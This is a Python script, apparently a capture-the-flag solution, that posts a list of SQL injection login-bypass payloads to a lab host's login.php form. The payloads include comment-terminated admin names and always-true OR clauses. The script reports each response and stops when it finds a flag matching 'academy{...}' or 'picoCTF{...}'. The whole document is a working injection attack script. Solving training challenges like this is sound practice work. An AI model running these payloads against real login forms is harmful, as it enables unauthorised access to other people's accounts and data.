import sys, re, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:47074"

tests = [
    ("admin'-- ", "x"),
    ("' OR 1=1-- ", "x"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin' #", "x"),
    ("admin'/*", "x"),
    ("admin", "' OR '1'='1"),
    ("alice", "x"),
]
for u, p in tests:
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    try:
        r = s.post(A + "/login.php", data={"username": u, "password": p}, timeout=20, allow_redirects=True)
        body = r.text
        fl = re.search(r"(?:academy|picoCTF)\{[^}]*\}", body)
        msg = ""
        for pat in (r"(?i)(invalid[^<]{0,60})", r"(?i)(welcome[^<]{0,60})", r"(?i)(error[^<]{0,80})",
                    r"(?i)(success[^<]{0,60})"):
            m = re.search(pat, body)
            if m:
                msg = m.group(1)[:70]
                break
        print("%-18r %-14r -> %s (%d o) %s" % (u, p, r.status_code, len(body), msg))
        if fl:
            print("   FLAG:", fl.group(0))
            break
    except Exception as e:
        print("%-18r ERR %s" % (u, type(e).__name__))
